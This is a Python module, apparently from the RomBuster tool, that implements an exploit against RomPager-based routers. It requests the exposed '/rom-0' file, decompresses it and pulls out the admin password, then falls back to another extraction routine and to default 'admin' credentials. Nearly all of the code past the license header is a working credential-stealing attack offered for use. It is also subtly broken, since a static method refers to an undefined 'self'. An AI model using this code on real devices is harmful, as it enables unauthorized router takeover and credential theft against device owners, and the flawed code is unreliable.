#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import re
import requests

import http.client

from pex.string import String
from .trigger import Trigger


class RomBuster(String):
    """ Main class of rombuster module.

    This main class of rombuster module is intended in providing
    an exploit for RomPager vulnerability that extracts credentials
    from the obtained rom-0 file.
    """

    @staticmethod
    def exploit(address: str) -> tuple:
        """ Exploit the vulnerability in RomPager and extract credentials.

        :param str address: target device address
        :return tuple: tuple of username and password
        """

        try:
            response = requests.get(
                f"http://{address}/rom-0",
                verify=False,
                timeout=3
            )

            username = 'admin'
            data = response.content[8568:]
            result, window = self.lzs_decompress(data)

            password = re.findall("([\040-\176]{5,})", result)
            if len(password):
                return username, password[0]

        except Exception:
            trigger = Trigger(address.split(':')[0])
            username, password = trigger.extract_credentials()

            if username is None and password is None:
                return None, None

            if not username and not password:
                return 'admin', 'admin'
            
            return username, password
